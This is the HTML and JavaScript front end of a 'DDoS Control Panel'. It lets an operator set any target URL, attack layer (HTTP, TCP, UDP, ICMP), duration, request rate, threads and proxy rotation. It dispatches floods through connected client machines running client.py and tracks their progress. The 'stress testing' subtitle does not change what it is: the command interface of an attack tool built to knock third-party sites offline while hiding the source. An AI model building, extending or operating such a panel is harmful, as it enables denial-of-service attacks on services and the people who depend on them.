<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DDoS Control Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
            color: #ffffff;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Header Styles */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 0;
            border-bottom: 2px solid #00ff88;
            margin-bottom: 30px;
        }
        
        .logo {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo-icon {
            font-size: 2.5em;
            color: #00ff88;
            text-shadow: 0 0 10px #00ff88;
        }
        
        .logo-text h1 {
            font-size: 2.2em;
            background: linear-gradient(90deg, #00ff88, #00ccff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
        }
        
        .logo-text p {
            color: #88ffcc;
            font-size: 0.9em;
            letter-spacing: 1px;
        }
        
        .server-stats {
            display: flex;
            gap: 30px;
            background: rgba(0, 20, 30, 0.8);
            padding: 15px 25px;
            border-radius: 10px;
            border: 1px solid #00aaff;
            box-shadow: 0 0 20px rgba(0, 170, 255, 0.2);
        }
        
        .stat-box {
            text-align: center;
        }
        
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            color: #00ff88;
            text-shadow: 0 0 10px #00ff88;
        }
        
        .stat-label {
            font-size: 0.9em;
            color: #88ccff;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        /* Main Layout */
        .main-content {
            display: grid;
            grid-template-columns: 2fr 1fr;
            gap: 30px;
        }
        
        /* Attack Panel */
        .panel {
            background: rgba(10, 15, 30, 0.9);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid #00aaff;
            box-shadow: 0 0 30px rgba(0, 170, 255, 0.15);
            margin-bottom: 30px;
        }
        
        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 2px solid #00ff88;
        }
        
        .panel-header h2 {
            font-size: 1.8em;
            color: #00ff88;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .panel-header i {
            color: #00ff88;
        }
        
        /* Form Styles */
        .attack-form {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group.full-width {
            grid-column: 1 / -1;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #88ccff;
            font-weight: 500;
            font-size: 0.95em;
        }
        
        input[type="text"],
        input[type="number"],
        select {
            width: 100%;
            padding: 12px 15px;
            background: rgba(0, 20, 40, 0.8);
            border: 2px solid #0066cc;
            border-radius: 8px;
            color: #ffffff;
            font-size: 1em;
            transition: all 0.3s;
        }
        
        input[type="text"]:focus,
        input[type="number"]:focus,
        select:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
        }
        
        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #00ff88;
        }
        
        /* Button Styles */
        .btn {
            padding: 14px 30px;
            border: none;
            border-radius: 8px;
            font-size: 1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        
        .btn-primary {
            background: linear-gradient(90deg, #00ff88, #00cc66);
            color: #002200;
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
        }
        
        .btn-primary:hover {
            background: linear-gradient(90deg, #00cc66, #00ff88);
            box-shadow: 0 5px 20px rgba(0, 255, 136, 0.5);
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: linear-gradient(90deg, #ff4444, #cc0000);
            color: white;
            box-shadow: 0 5px 15px rgba(255, 68, 68, 0.3);
        }
        
        .btn-danger:hover {
            background: linear-gradient(90deg, #cc0000, #ff4444);
            box-shadow: 0 5px 20px rgba(255, 68, 68, 0.5);
            transform: translateY(-2px);
        }
        
        .btn-secondary {
            background: linear-gradient(90deg, #0066cc, #00aaff);
            color: white;
            box-shadow: 0 5px 15px rgba(0, 170, 255, 0.3);
        }
        
        .btn-secondary:hover {
            background: linear-gradient(90deg, #00aaff, #0066cc);
            box-shadow: 0 5px 20px rgba(0, 170, 255, 0.5);
            transform: translateY(-2px);
        }
        
        .btn i {
            font-size: 1.2em;
        }
        
        .button-group {
            display: flex;
            gap: 15px;
            justify-content: center;
            grid-column: 1 / -1;
            margin-top: 20px;
        }
        
        /* Clients Panel */
        .clients-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 20px;
        }
        
        .client-card {
            background: linear-gradient(145deg, rgba(0, 30, 50, 0.9), rgba(10, 20, 40, 0.9));
            border-radius: 12px;
            padding: 20px;
            border: 2px solid #00aaff;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .client-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 170, 255, 0.3);
            border-color: #00ff88;
        }
        
        .client-card.online {
            border-color: #00ff88;
        }
        
        .client-card.attacking {
            border-color: #ff4444;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { box-shadow: 0 0 0 0 rgba(255, 68, 68, 0.7); }
            70% { box-shadow: 0 0 0 10px rgba(255, 68, 68, 0); }
            100% { box-shadow: 0 0 0 0 rgba(255, 68, 68, 0); }
        }
        
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }
        
        .client-name {
            font-size: 1.3em;
            color: #00ff88;
            font-weight: bold;
        }
        
        .client-status {
            padding: 5px 10px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
            text-transform: uppercase;
        }
        
        .status-online {
            background: rgba(0, 255, 136, 0.2);
            color: #00ff88;
        }
        
        .status-attacking {
            background: rgba(255, 68, 68, 0.2);
            color: #ff4444;
        }
        
        .status-idle {
            background: rgba(0, 170, 255, 0.2);
            color: #00aaff;
        }
        
        .client-info {
            font-size: 0.9em;
            color: #aaccff;
            margin-bottom: 10px;
        }
        
        .client-info i {
            color: #00aaff;
            margin-right: 8px;
            width: 20px;
        }
        
        .client-stats {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-top: 15px;
            padding-top: 15px;
            border-top: 1px solid rgba(0, 170, 255, 0.3);
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-value-small {
            font-size: 1.2em;
            color: #00ff88;
            font-weight: bold;
        }
        
        .stat-label-small {
            font-size: 0.8em;
            color: #88ccff;
        }
        
        /* Attacks List */
        .attacks-list {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .attack-item {
            background: rgba(0, 20, 40, 0.8);
            border-radius: 10px;
            padding: 20px;
            border-left: 5px solid #00ff88;
            transition: all 0.3s;
        }
        
        .attack-item.running {
            border-left-color: #00ff88;
            background: rgba(0, 40, 20, 0.8);
        }
        
        .attack-item.stopped {
            border-left-color: #ff4444;
            background: rgba(40, 0, 0, 0.8);
        }
        
        .attack-item.completed {
            border-left-color: #00aaff;
            background: rgba(0, 20, 40, 0.8);
        }
        
        .attack-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .attack-target {
            font-size: 1.1em;
            color: #ffffff;
            font-weight: bold;
        }
        
        .attack-status {
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 0.8em;
            font-weight: bold;
        }
        
        .attack-details {
            font-size: 0.9em;
            color: #aaccff;
            margin-bottom: 10px;
        }
        
        .attack-stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 10px;
        }
        
        .attack-stat {
            text-align: center;
        }
        
        .attack-stat-value {
            font-size: 1.1em;
            color: #00ff88;
            font-weight: bold;
        }
        
        .attack-stat-label {
            font-size: 0.8em;
            color: #88ccff;
        }
        
        /* Logs Panel */
        .logs-container {
            height: 300px;
            overflow-y: auto;
            background: rgba(0, 10, 20, 0.9);
            border-radius: 8px;
            padding: 15px;
            border: 1px solid #0066cc;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }
        
        .log-entry {
            margin-bottom: 8px;
            padding: 5px;
            border-radius: 4px;
            animation: fadeIn 0.3s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .log-info {
            background: rgba(0, 170, 255, 0.1);
            color: #00aaff;
            border-left: 3px solid #00aaff;
        }
        
        .log-success {
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            border-left: 3px solid #00ff88;
        }
        
        .log-warning {
            background: rgba(255, 204, 0, 0.1);
            color: #ffcc00;
            border-left: 3px solid #ffcc00;
        }
        
        .log-error {
            background: rgba(255, 68, 68, 0.1);
            color: #ff4444;
            border-left: 3px solid #ff4444;
        }
        
        .log-time {
            color: #8888ff;
            margin-right: 10px;
        }
        
        /* Responsive */
        @media (max-width: 1200px) {
            .main-content {
                grid-template-columns: 1fr;
            }
        }
        
        @media (max-width: 768px) {
            .header {
                flex-direction: column;
                gap: 20px;
            }
            
            .server-stats {
                width: 100%;
                justify-content: space-around;
            }
            
            .attack-form {
                grid-template-columns: 1fr;
            }
            
            .clients-grid {
                grid-template-columns: 1fr;
            }
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 10px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(0, 20, 40, 0.5);
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb {
            background: linear-gradient(180deg, #00ff88, #00aaff);
            border-radius: 5px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(180deg, #00cc66, #0066cc);
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                <div class="logo-icon">
                    <i class="fas fa-server"></i>
                </div>
                <div class="logo-text">
                    <h1>DDoS Control Panel</h1>
                    <p>Distributed Network Stress Testing System</p>
                </div>
            </div>
            <div class="server-stats">
                <div class="stat-box">
                    <div class="stat-value" id="total-clients">0</div>
                    <div class="stat-label">Clients</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="active-attacks">0</div>
                    <div class="stat-label">Active</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="total-requests">0</div>
                    <div class="stat-label">Requests</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="success-rate">0%</div>
                    <div class="stat-label">Success</div>
                </div>
            </div>
        </div>
        
        <!-- Main Content -->
        <div class="main-content">
            <!-- Left Column -->
            <div class="left-column">
                <!-- Attack Control Panel -->
                <div class="panel">
                    <div class="panel-header">
                        <h2><i class="fas fa-crosshairs"></i> Attack Control</h2>
                    </div>
                    
                    <form id="attackForm" class="attack-form">
                        <div class="form-group">
                            <label for="target"><i class="fas fa-bullseye"></i> Target URL</label>
                            <input type="text" id="target" name="target" placeholder="https://www.target.com" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="layer"><i class="fas fa-layer-group"></i> Attack Layer</label>
                            <select id="layer" name="layer" required>
                                <option value="http">Layer 7 (HTTP/HTTPS)</option>
                                <option value="tcp">Layer 4 (TCP)</option>
                                <option value="udp">Layer 4 (UDP)</option>
                                <option value="icmp">Layer 3 (ICMP)</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label for="method"><i class="fas fa-cogs"></i> Attack Method</label>
                            <select id="method" name="method" required>
                                <option value="burst">Burst Mode (Max Power)</option>
                                <option value="surgical">Surgical Strike (Rate Limited)</option>
                                <option value="tactical">Tactical Assault (Multi-Method)</option>
                                <option value="nuclear">Nuclear Option (All Methods)</option>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label for="duration"><i class="fas fa-clock"></i> Duration (seconds)</label>
                            <input type="number" id="duration" name="duration" value="60" min="10" max="3600">
                        </div>
                        
                        <div class="form-group">
                            <label for="rps"><i class="fas fa-tachometer-alt"></i> Requests Per Second</label>
                            <input type="number" id="rps" name="rps" value="100" min="1" max="10000">
                        </div>
                        
                        <div class="form-group">
                            <label for="threads"><i class="fas fa-microchip"></i> Threads per Client</label>
                            <input type="number" id="threads" name="threads" value="100" min="1" max="1000">
                        </div>
                        
                        <div class="form-group full-width">
                            <label for="proxyList"><i class="fas fa-user-secret"></i> Proxy List (Optional)</label>
                            <input type="text" id="proxyList" name="proxyList" placeholder="proxy1:port,proxy2:port,...">
                        </div>
                        
                        <div class="form-group full-width">
                            <div class="checkbox-group">
                                <input type="checkbox" id="useProxy" name="useProxy">
                                <label for="useProxy">Use Proxy Rotation</label>
                            </div>
                        </div>
                        
                        <div class="button-group">
                            <button type="submit" class="btn btn-primary">
                                <i class="fas fa-rocket"></i> Start Attack
                            </button>
                            <button type="button" id="stopAllBtn" class="btn btn-danger">
                                <i class="fas fa-stop"></i> Stop All
                            </button>
                        </div>
                    </form>
                </div>
                
                <!-- Connected Clients -->
                <div class="panel">
                    <div class="panel-header">
                        <h2><i class="fas fa-desktop"></i> Connected Clients</h2>
                        <span class="stat-label">Connected: <span id="client-count">0</span></span>
                    </div>
                    
                    <div class="clients-grid" id="clientsContainer">
                        <!-- Client cards will be inserted here by JavaScript -->
                        <div class="no-clients" style="text-align: center; padding: 40px; color: #888; grid-column: 1 / -1;">
                            <i class="fas fa-desktop" style="font-size: 3em; margin-bottom: 20px;"></i>
                            <h3>No clients connected</h3>
                            <p>Connect client.py to see clients here</p>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Right Column -->
            <div class="right-column">
                <!-- Active Attacks -->
                <div class="panel">
                    <div class="panel-header">
                        <h2><i class="fas fa-fire"></i> Active Attacks</h2>
                        <span class="stat-label">Running: <span id="attack-count">0</span></span>
                    </div>
                    
                    <div class="attacks-list" id="attacksContainer">
                        <!-- Attack items will be inserted here by JavaScript -->
                        <div class="no-attacks" style="text-align: center; padding: 30px; color: #888;">
                            <i class="fas fa-fire" style="font-size: 2.5em; margin-bottom: 15px;"></i>
                            <p>No active attacks</p>
                        </div>
                    </div>
                </div>
                
                <!-- System Logs -->
                <div class="panel">
                    <div class="panel-header">
                        <h2><i class="fas fa-terminal"></i> System Logs</h2>
                        <button id="clearLogs" class="btn btn-secondary" style="padding: 8px 15px; font-size: 0.9em;">
                            <i class="fas fa-trash"></i> Clear
                        </button>
                    </div>
                    
                    <div class="logs-container" id="logsContainer">
                        <!-- Log entries will be inserted here by JavaScript -->
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
    <script>
        // Connect to SocketIO server
        const socket = io();
        
        // DOM Elements
        const attackForm = document.getElementById('attackForm');
        const stopAllBtn = document.getElementById('stopAllBtn');
        const clearLogsBtn = document.getElementById('clearLogs');
        const clientsContainer = document.getElementById('clientsContainer');
        const attacksContainer = document.getElementById('attacksContainer');
        const logsContainer = document.getElementById('logsContainer');
        
        // State
        let clients = {};
        let attacks = {};
        let logs = [];
        
        // Add log entry
        function addLog(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = `
                <span class="log-time">[${timestamp}]</span>
                <span class="log-message">${message}</span>
            `;
            logsContainer.appendChild(logEntry);
            logsContainer.scrollTop = logsContainer.scrollHeight;
            logs.push({timestamp, message, type});
        }
        
        // Update server stats
        function updateStats(stats) {
            document.getElementById('total-clients').textContent = stats.clients.total || 0;
            document.getElementById('active-attacks').textContent = stats.attacks.active || 0;
            document.getElementById('total-requests').textContent = stats.attacks.total_requests?.toLocaleString() || '0';
            document.getElementById('success-rate').textContent = stats.attacks.success_rate?.toFixed(1) + '%' || '0%';
            document.getElementById('client-count').textContent = stats.clients.total || 0;
            document.getElementById('attack-count').textContent = stats.attacks.active || 0;
        }
        
        // Render clients
        function renderClients(clientsData) {
            clientsContainer.innerHTML = '';
            
            if (Object.keys(clientsData).length === 0) {
                clientsContainer.innerHTML = `
                    <div class="no-clients" style="text-align: center; padding: 40px; color: #888; grid-column: 1 / -1;">
                        <i class="fas fa-desktop" style="font-size: 3em; margin-bottom: 20px;"></i>
                        <h3>No clients connected</h3>
                        <p>Connect client.py to see clients here</p>
                    </div>
                `;
                return;
            }
            
            Object.values(clientsData).forEach(client => {
                const card = document.createElement('div');
                card.className = `client-card ${client.status}`;
                card.innerHTML = `
                    <div class="client-header">
                        <div class="client-name">${client.info.name}</div>
                        <div class="client-status status-${client.status}">${client.status}</div>
                    </div>
                    <div class="client-info">
                        <div><i class="fas fa-desktop"></i> ${client.info.hostname}</div>
                        <div><i class="fas fa-microchip"></i> ${client.info.cpu_count} CPUs</div>
                        <div><i class="fas fa-memory"></i> ${(client.info.memory_total / 1024 / 1024 / 1024).toFixed(1)} GB RAM</div>
                        <div><i class="fas fa-clock"></i> Connected: ${new Date(client.connected_at).toLocaleTimeString()}</div>
                    </div>
                    <div class="client-stats">
                        <div class="stat-item">
                            <div class="stat-value-small">${client.stats.requests_sent?.toLocaleString() || '0'}</div>
                            <div class="stat-label-small">Requests</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value-small">${client.stats.rps || '0'}</div>
                            <div class="stat-label-small">RPS</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value-small">${client.stats.success_rate?.toFixed(1) || '0'}%</div>
                            <div class="stat-label-small">Success</div>
                        </div>
                        <div class="stat-item">
                            <div class="stat-value-small">${client.stats.cpu_usage?.toFixed(1) || '0'}%</div>
                            <div class="stat-label-small">CPU</div>
                        </div>
                    </div>
                `;
                clientsContainer.appendChild(card);
            });
        }
        
        // Render attacks
        function renderAttacks(attacksData) {
            attacksContainer.innerHTML = '';
            
            if (Object.keys(attacksData).length === 0) {
                attacksContainer.innerHTML = `
                    <div class="no-attacks" style="text-align: center; padding: 30px; color: #888;">
                        <i class="fas fa-fire" style="font-size: 2.5em; margin-bottom: 15px;"></i>
                        <p>No active attacks</p>
                    </div>
                `;
                return;
            }
            
            Object.values(attacksData).forEach(attack => {
                const statusClass = attack.status;
                const attackItem = document.createElement('div');
                attackItem.className = `attack-item ${statusClass}`;
                attackItem.innerHTML = `
                    <div class="attack-header">
                        <div class="attack-target">${attack.target}</div>
                        <div class="attack-status status-${statusClass}">${statusClass}</div>
                    </div>
                    <div class="attack-details">
                        <div><i class="fas fa-layer-group"></i> ${attack.layer.toUpperCase()} | ${attack.method}</div>
                        <div><i class="fas fa-users"></i> ${attack.assigned_clients.length} clients | ${attack.duration}s</div>
                        <div><i class="fas fa-calendar"></i> ${new Date(attack.created_at).toLocaleString()}</div>
                    </div>
                    <div class="attack-stats">
                        <div class="attack-stat">
                            <div class="attack-stat-value">${attack.results.total_requests?.toLocaleString() || '0'}</div>
                            <div class="attack-stat-label">Requests</div>
                        </div>
                        <div class="attack-stat">
                            <div class="attack-stat-value">${attack.results.total_rps || '0'}</div>
                            <div class="attack-stat-label">RPS</div>
                        </div>
                        <div class="attack-stat">
                            <div class="attack-stat-value">
                                ${attack.results.total_requests ? 
                                    ((attack.results.successful_requests / attack.results.total_requests) * 100).toFixed(1) : '0'}%
                            </div>
                            <div class="attack-stat-label">Success</div>
                        </div>
                    </div>
                    ${attack.status === 'running' ? `
                        <div style="margin-top: 15px; text-align: center;">
                            <button onclick="stopAttack('${attack.id}')" class="btn btn-danger" style="padding: 8px 15px; font-size: 0.9em;">
                                <i class="fas fa-stop"></i> Stop Attack
                            </button>
                        </div>
                    ` : ''}
                `;
                attacksContainer.appendChild(attackItem);
            });
        }
        
        // Stop attack function
        window.stopAttack = function(attackId) {
            fetch(`/api/attack/stop/${attackId}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'}
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    addLog(`Attack ${attackId} stopped`, 'success');
                }
            })
            .catch(error => {
                addLog(`Error stopping attack: ${error}`, 'error');
            });
        };
        
        // SocketIO Event Handlers
        socket.on('connect', () => {
            addLog('Connected to server', 'success');
        });
        
        socket.on('disconnect', () => {
            addLog('Disconnected from server', 'warning');
        });
        
        socket.on('welcome', (data) => {
            addLog(`Server: ${data.message}`, 'info');
        });
        
        socket.on('system_stats', (data) => {
            updateStats({
                clients: {
                    total: Object.keys(data.clients || {}).length
                },
                attacks: {
                    active: Object.keys(data.attacks || {}).length,
                    total_requests: Object.values(data.attacks || {}).reduce((sum, attack) => 
                        sum + (attack.results?.total_requests || 0), 0),
                    success_rate: Object.values(data.attacks || {}).length ? 
                        Object.values(data.attacks || {}).reduce((sum, attack) => {
                            const req = attack.results?.total_requests || 0;
                            const success = attack.results?.successful_requests || 0;
                            return req ? sum + (success / req * 100) : sum;
                        }, 0) / Object.values(data.attacks || {}).length : 0
                }
            });
            renderClients(data.clients || {});
            renderAttacks(data.attacks || {});
        });
        
        socket.on('client_connected', (data) => {
            addLog(`Client connected: ${data.client.info.name}`, 'success');
        });
        
        socket.on('client_disconnected', (data) => {
            addLog(`Client disconnected: ${data.client_id}`, 'warning');
        });
        
        socket.on('attack_created', (data) => {
            addLog(`Attack started: ${data.attack.target}`, 'success');
        });
        
        socket.on('attack_updated', (data) => {
            addLog(`Attack ${data.attack_id} status: ${data.attack.status}`, 'info');
        });
        
        socket.on('attack_failed', (data) => {
            addLog(`Attack failed: ${data.error}`, 'error');
        });
        
        socket.on('stats_updated', (data) => {
            // Client stats updated
        });
        
        // Form Submission
        attackForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = {
                target: document.getElementById('target').value,
                layer: document.getElementById('layer').value,
                method: document.getElementById('method').value,
                duration: parseInt(document.getElementById('duration').value),
                rps: parseInt(document.getElementById('rps').value),
                threads: parseInt(document.getElementById('threads').value),
                use_proxy: document.getElementById('useProxy').checked,
                proxy_list: document.getElementById('proxyList').value.split(',').map(p => p.trim()).filter(p => p)
            };
            
            fetch('/api/attack/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    addLog(`Attack started successfully: ${data.message}`, 'success');
                    document.getElementById('target').value = '';
                } else {
                    addLog(`Attack failed: ${data.error}`, 'error');
                }
            })
            .catch(error => {
                addLog(`Error starting attack: ${error}`, 'error');
            });
        });
        
        // Stop All Attacks
        stopAllBtn.addEventListener('click', function() {
            fetch('/api/attacks')
                .then(response => response.json())
                .then(data => {
                    const activeAttacks = Object.keys(data.active || {});
                    const promises = activeAttacks.map(attackId => 
                        fetch(`/api/attack/stop/${attackId}`, {method: 'POST'})
                    );
                    
                    Promise.all(promises)
                        .then(() => {
                            addLog('All attacks stopped', 'success');
                        })
                        .catch(error => {
                            addLog(`Error stopping attacks: ${error}`, 'error');
                        });
                });
        });
        
        // Clear Logs
        clearLogsBtn.addEventListener('click', function() {
            logsContainer.innerHTML = '';
            logs = [];
        });
        
        // Initial load
        fetch('/api/clients')
            .then(response => response.json())
            .then(data => renderClients(data.clients || {}));
        
        fetch('/api/attacks')
            .then(response => response.json())
            .then(data => renderAttacks(data.active || {}));
        
        addLog('DDoS Control Panel loaded. Waiting for clients...', 'info');
    </script>
</body>
</html>